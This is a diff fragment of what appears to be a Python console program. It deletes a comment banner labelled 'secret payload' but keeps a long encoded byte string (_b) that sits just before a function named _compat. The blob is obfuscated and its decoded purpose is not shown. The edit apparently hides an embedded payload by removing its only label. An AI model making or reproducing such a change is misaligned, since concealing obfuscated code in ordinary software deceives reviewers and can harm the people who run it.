@@ -26,9 +26,7 @@ R_MAX = 100000
 
 console = Console()
 
-# --------------------------------------------------
-# secret payload
-# --------------------------------------------------
+
 _b = b"""c-rlkO^(AL42Abx!}12i1tKAF|5FW^UxOhelg&u;R5dMyug}J&se(_X{x%K~KXvypF8V{kqcjF;F&U1(hOJd7jXp<af*RiclE`r{p&K0Npw~Pl(FPn18ADHW(Wkhyw9O}ibIw}picE$Q=KxnZq=@QZ9kqSy0tazMCZ!O$v5^?2BimawS~D#miqq0#p%@CYqZ*6+q|lNfBHM1DDi1_=l$_BW<gL@j^7WRfdrz#gbCsBIxeRi;dN)>*E4z@~C1AsqAyZ!D{LMI5R_0Bk^Q+@U98?Tb+6i0p1i8>Oi;&w>ow->cv<LgR%OAmITq`_A)>~y92&{$EJx|2REJW|y0U`K;g5x~d8ec7rIwRp0_ENNSe5o<*bzK%^+@Vqvg`#)hy}67l!7g|(jrY|Oi_%cOe8_63Z%6Ki(j2O4$WtFLm93}N@*c=r!rfNDnDbH=Sw0GT+&!-y^1+fG54w6l!Iqa8=^zg_+~thbzHj>cLptJM-8nTTxE#ck&sm<_0o>uDyRe(+VLeH~BVNootj#gp0S_e@po{~3lRywUmj5uq32%2E0IqS5d9bLvSG@6lamK-Ydn}yExEo@<eZp;%9r2)?Qn=6)+!nOMNx(bO7RQN4sQ&)$$=`<qT!p3!zLdgG^^g0<o#B1}L!7Pd"""
 
 def _compat():
